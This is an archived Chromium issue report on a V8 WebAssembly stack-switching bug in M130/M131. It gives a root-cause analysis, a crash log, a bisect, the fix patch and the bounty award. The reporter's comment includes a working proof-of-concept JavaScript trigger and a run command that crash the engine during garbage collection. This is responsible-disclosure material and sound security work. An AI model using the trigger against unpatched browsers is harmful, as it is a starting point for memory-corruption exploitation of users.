# Debug check failed: kCanBeWeak || (!IsSmi() == HAS_STRONG_HEAP_OBJECT_TAG(ptr_)).

| Field | Value |
|-------|-------|
| **Issue ID** | [377384894](https://issues.chromium.org/issues/377384894) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>WebAssembly |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | jo...@gmail.com |
| **Assignee** | th...@chromium.org |
| **Created** | 2024-11-05 |
| **Bounty** | $8,000.00 |

## Description

# Title:

Debug check failed: kCanBeWeak || (!IsSmi() == HAS\_STRONG\_HEAP\_OBJECT\_TAG(ptr\_)).

## Component:

Blink>JavaScript>Runtime

## Description:

In M130 and M131, the wasm-to-js frame is treated as `StackFrame::WASM_TO_JS_FUNCTION` after the tier-up of the wasm-to-js wrapper.

However, in function `Isolate::UnwindAndFindHandler`, this frame fails to call `HandleStackSwitch(iter)` because type `StackFrame::WASM_TO_JS_FUNCTION` is not handled by the switch-case.

Now only `StackFrame::WASM_TO_JS` and `StackFrame::STUB` can call the `HandleStackSwitch`.

```
Tagged<Object> Isolate::UnwindAndFindHandler() {
  ...
#if V8_ENABLE_WEBASSEMBLY
  auto HandleStackSwitch = [&](StackFrameIterator& iter) {
    if (iter.wasm_stack() == nullptr) return;
    auto& switch_info = iter.wasm_stack()->stack_switch_info();
    if (!switch_info.has_value()) return;
    Tagged<Object> suspender_obj = root(RootIndex::kActiveSuspender);
    if (!IsUndefined(suspender_obj)) {
      // If the wasm-to-js wrapper was on a secondary stack and switched
      // to the central stack, handle the implicit switch back.
      if (switch_info.source_fp == iter.frame()->fp()) {
        thread_local_top()->is_on_central_stack_flag_ = false;
        stack_guard()->SetStackLimitForStackSwitching(
            reinterpret_cast<uintptr_t>(iter.wasm_stack()->jslimit()));
        iter.wasm_stack()->clear_stack_switch_info();
      }
    }
  };
#endif

  ...
  for (StackFrameIterator iter(this, thread_local_top(),
                               StackFrameIterator::NoHandles{});
       ; iter.Advance(), visited_frames++) {
    ...
    switch (frame->type()) {
      ...
      case StackFrame::WASM_TO_JS: {
        HandleStackSwitch(iter);                                           [1]
        break;
      }
      ...
      case StackFrame::STUB: {
#if V8_ENABLE_WEBASSEMBLY
        HandleStackSwitch(iter);                                           [2]
#endif

```

As a result, `clear_stack_switch_info` will not be executed.

Further more, when GC is triggered in the secondary stack from the wasm-to-js wrapper, the function `TypedFrame::Iterate` will get the remaining `stack_switch_info` and treat the frame as a stack-switching case and calculate a wrong `parameters_limit` address which points to the main stack.

Then there may be a huge space between `parameters_base` and `parameters_limit`, causing DCHECK or SEGV.

```
void TypedFrame::Iterate(RootVisitor* v) const {
  ...
  wasm::StackMemory::StackSwitchInfo maybe_stack_switch;
  if (iterator_->wasm_stack() != nullptr) {
    maybe_stack_switch = iterator_->wasm_stack()->stack_switch_info();
  }
  FullObjectSlot parameters_limit(
      maybe_stack_switch.has_value() && maybe_stack_switch.source_fp == fp()            [3]
          ? maybe_stack_switch.target_sp
          : frame_header_base.address() - spill_slots_size);
#else
  FullObjectSlot parameters_limit(frame_header_base.address() -
                                  spill_slots_size);
#endif
  FullObjectSlot parameters_base(&Memory<Address>(sp()));
  FullObjectSlot spill_slots_end(frame_header_base.address() -
                                 spill_slots_size);

  // Visit the rest of the parameters.
  if (HasTaggedOutgoingParams(code)) {
    v->VisitRootPointers(Root::kStackRoots, nullptr, parameters_base,                  [4]
                         parameters_limit);
  }

```

I wrote a testcase to trigger this vulnerability.

This vulnerability will not influence new M132 versions after commit 534c66a175cef8102cbe8b5562cc44269eb69048 because then the tier-up wrapper code is added to the cache and the frame will be treated as `StackFrame::WASM_TO_JS`. So, this vulnerability is hidden then.

Just use a d8 debug build `d8-asan-linux-debug-v8-component-96808.zip` from <https://commondatastorage.googleapis.com/v8-asan/index.html?prefix=linux-debug/> to trigger it.

run command

```
./d8 --experimental-wasm-jspi --turboshaft-wasm-wrappers poc.js

```

It will crash with DCHECK `Debug check failed: kCanBeWeak || (!IsSmi() == HAS_STRONG_HEAP_OBJECT_TAG(ptr_))`.

And in the release version, it may get a SEGV during GC.

I think this vulnerability may be exploited. I will try and update if success.

## Crash Log:

```
#
# Fatal error in ../../src/objects/tagged-impl.h, line 147
# Debug check failed: kCanBeWeak || (!IsSmi() == HAS_STRONG_HEAP_OBJECT_TAG(ptr_)).
#
#
#
#FailureMessage Object: 0x7213a2628060
==== C stack trace ===============================

    /test/test/d8(__interceptor_backtrace+0x46) [0x5700cf3d1ea6]
    /test/test/libv8_libbase.so(v8::base::debug::StackTrace::StackTrace()+0x13) [0x7213a61e3ac3]
    /test/test/libv8_libplatform.so(+0x358da) [0x7213b18d28da]
    /test/test/libv8_libbase.so(V8_Fatal(char const*, int, char const*, ...)+0x2a0) [0x7213a61ae260]
    /test/test/libv8_libbase.so(+0x5732f) [0x7213a61ad32f]
    /test/test/libv8.so(v8::internal::ClearStaleLeftTrimmedPointerVisitor::VisitRootPointers(v8::internal::Root, char const*, v8::internal::FullObjectSlot, v8::internal::FullObjectSlot)+0x118) [0x7213ab3ec118]
    /test/test/libv8.so(v8::internal::TypedFrame::Iterate(v8::internal::RootVisitor*) const+0x5c0) [0x7213aaec4790]
    /test/test/libv8.so(v8::internal::Isolate::Iterate(v8::internal::RootVisitor*, v8::internal::ThreadLocalTop*)+0x578) [0x7213aaefef38]
    /test/test/libv8.so(v8::internal::Heap::IterateRoots(v8::internal::RootVisitor*, v8::base::EnumSet<v8::internal::SkipRoot, int>, v8::internal::Heap::IterateRootsMode)+0x539) [0x7213ab39ec39]
    /test/test/libv8.so(v8::internal::ScavengerCollector::CollectGarbage()+0x11cb) [0x7213ab60276b]
    /test/test/libv8.so(v8::internal::Heap::Scavenge()+0x57a) [0x7213ab38da6a]
    /test/test/libv8.so(v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::internal::GarbageCollectionReason, char const*)+0xc09) [0x7213ab38a3d9]
    /test/test/libv8.so(+0x51f3522) [0x7213ab3f3522]
    /test/test/libv8.so(+0x51f2d07) [0x7213ab3f2d07]
    /test/test/libv8.so(+0x82c0283) [0x7213ae4c0283]
Trace/breakpoint trap

```
## VERSION

Chrome Version: M130, M131

Operating System: Linux

## CREDIT

Anonymous.

## Timeline

### jo...@gmail.com (2024-11-05)

## BISECT:

<https://chromium-review.googlesource.com/c/v8/v8/+/5797181>

```
[wasm] Refactor central stack switches

Instead of storing the stack limit and stack pointer in a fixed slot of
the switching frame, store this information in the StackMemory. This
makes the logic independent of the frame type, which will make it easier
to extend to other code kinds, and in particular to wasm builtins.

Bug: 349640002,42202153
Change-Id: Iac523b53d0c4e0f184dc7ac736d3a41ecb0b7228
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5797181
Commit-Queue: Thibaud Michaud <thibaudm@chromium.org>
Reviewed-by: Jakob Kummerow <jkummerow@chromium.org>
Cr-Commit-Position: refs/heads/main@{#95742}

```
## FIX PATCH:

```
--- a/src/execution/isolate.cc
+++ b/src/execution/isolate.cc
@@ -2444,7 +2444,8 @@ Tagged<Object> Isolate::UnwindAndFindHandler() {
         // out to user code that could throw.
         UNREACHABLE();
       }
-      case StackFrame::WASM_TO_JS: {
+      case StackFrame::WASM_TO_JS:
+      case StackFrame::WASM_TO_JS_FUNCTION: {
         HandleStackSwitch(iter);
         break;
       }

```

### jo...@gmail.com (2024-11-05)

## poc.js

```
let wasm_module = new WebAssembly.Module(new Uint8Array([0,97,115,109,1,0,0,0,1,12,1,96,6,127,127,127,127,127,127,2,127,127,2,7,1,1,109,1,102,0,0,7,8,1,4,98,111,111,109,0,0]));
let wasm_instance = new WebAssembly.Instance(wasm_module, {m:{f: () => {throw 'boom'}}});
let boom = WebAssembly.promising(wasm_instance.exports.boom);
while (true) { boom(0x5deadbea, 0x5deadbea, 0x5deadbea, 0x5deadbea, 0x5deadbea, 0x5deadbea);}

```

### pe...@google.com (2024-11-05)

Setting milestone because of s0/s1 severity.

### pe...@google.com (2024-11-05)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### th...@chromium.org (2024-11-05)

I think that after 534c66a175cef8102cbe8b5562cc44269eb69048 ("[wasm][type-reflection] Use shared wrappers for WasmJSFunctions"), the WASM_TO_JS_FUNCTION frame type is not used anymore and can be removed completely (along with some dead code in frames.cc). This means that this is no longer an issue in 132.
It does look like a vulnerability for 130 and 131 though, I'll prepare the suggested change for backmerge before doing the larger cleanup.

### ap...@google.com (2024-11-06)

Project: v8/v8  

Branch: main  

Author: Thibaud Michaud <[thibaudm@chromium.org](mailto:thibaudm@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/5993739>

[wasm][jspi] Fix stack-switching in unwinder

---


Expand for full commit details
```
[wasm][jspi] Fix stack-switching in unwinder 
 
Handle stack switching for a missing frame type, WASM_TO_JS_FUNCTION. 
 
R=jkummerow@chromium.org 
 
Fixed: 377384894 
Change-Id: I9bf11081818365d870534b901985c14e1013e7c3 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/5993739 
Commit-Queue: Thibaud Michaud <thibaudm@chromium.org> 
Reviewed-by: Jakob Kummerow <jkummerow@chromium.org> 
Cr-Commit-Position: refs/heads/main@{#97003}

```

---

Files:

- M `src/execution/isolate.cc`

---

Hash: ef6ed156f1b78006de28ef262b55468d511d6984  

Date:  Tue Nov 05 18:51:44 2024


---

### am...@chromium.org (2024-11-06)

M131 will be promoted and shipping to Stable on Tuesday. The RC for M131 for Stable release was already cut yesterday. We'll keep this in the review queue to allow this fix to get more bake time on Canary and reassess for merge later this week to include this fix in an M131 Stable update the following week.
M130 review will need to take place only after the initial M130 Extended Stable RC release has occurred to ensure this is included in M131 Stable first or in parallel.

### am...@chromium.org (2024-11-13)

merges to M130 and 131 approved for <https://crrev.com/c/5993739>; please merge this change to 13.1 and 13.0 by EOD tomorrow, Thursday, 14 November so this fix can be included in the next Stable and Extended Stable updates

### sp...@google.com (2024-11-14)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $8000.00 for this report.

Rationale for this decision:
$7,000 for report of potential memory corruption in the renderer + $1,000 bisect bonus


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2024-11-14)

Congratulations! Thank you for your efforts and reporting this issue to us.

### ap...@google.com (2024-11-14)

Project: v8/v8  

Branch: refs/branch-heads/13.1  

Author: Thibaud Michaud <[thibaudm@chromium.org](mailto:thibaudm@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6023136>

Merged: [wasm][jspi] Fix stack-switching in unwinder

---


Expand for full commit details
```
Merged: [wasm][jspi] Fix stack-switching in unwinder 
 
Handle stack switching for a missing frame type, WASM_TO_JS_FUNCTION. 
 
R=jkummerow@chromium.org 
 
Fixed: 377384894 
(cherry picked from commit ef6ed156f1b78006de28ef262b55468d511d6984) 
 
Change-Id: I01ccd63b2ae4735eb1c68cda48710556c93bfa78 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6023136 
Reviewed-by: Jakob Linke <jgruber@chromium.org> 
Commit-Queue: Thibaud Michaud <thibaudm@chromium.org> 
Cr-Commit-Position: refs/branch-heads/13.1@{#16} 
Cr-Branched-From: 7998da66cb2883ef9734743857713b1194212d9a-refs/heads/13.1.201@{#1} 
Cr-Branched-From: 5e9af2a913539cf67091def99b62f49afece6f56-refs/heads/main@{#96554}

```

---

Files:

- M `src/execution/isolate.cc`

---

Hash: 585524c037402fa2d8d8f45bf8f2a62c454bc392  

Date:  Tue Nov 05 18:51:44 2024


---

### ap...@google.com (2024-11-14)

Project: v8/v8  

Branch: refs/branch-heads/13.0  

Author: Thibaud Michaud <[thibaudm@chromium.org](mailto:thibaudm@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6020069>

Merged: [wasm][jspi] Fix stack-switching in unwinder

---


Expand for full commit details
```
Merged: [wasm][jspi] Fix stack-switching in unwinder 
 
Handle stack switching for a missing frame type, WASM_TO_JS_FUNCTION. 
 
R=jkummerow@chromium.org 
 
Fixed: 377384894 
(cherry picked from commit ef6ed156f1b78006de28ef262b55468d511d6984) 
 
Change-Id: Ib5e038ba26827002390fdff3b50ddea6e25a527f 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6020069 
Reviewed-by: Jakob Linke <jgruber@chromium.org> 
Commit-Queue: Thibaud Michaud <thibaudm@chromium.org> 
Cr-Commit-Position: refs/branch-heads/13.0@{#37} 
Cr-Branched-From: 4be854bd71ea878a25b236a27afcecffa2e29360-refs/heads/13.0.245@{#1} 
Cr-Branched-From: 1f5183f7ad6cca21029fd60653d075730c644432-refs/heads/main@{#96103}

```

---

Files:

- M `src/execution/isolate.cc`

---

Hash: 3a3aa00bc0d71c916afa6329cc8e5b91c6fdc30d  

Date:  Tue Nov 05 18:51:44 2024


---

### pe...@google.com (2024-11-14)

LTS Milestone M126

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### qk...@google.com (2024-11-15)

Labeling as LTS-NotApplicable-126 because the suspected CL[1] was not merged to M126 LTS. So it looks like we don't need to merge the fix to M126 LTS.

[1] https://chromium-review.googlesource.com/c/v8/v8/+/5797181

### pe...@google.com (2024-11-18)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### ph...@google.com (2025-02-17)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/377384894)*
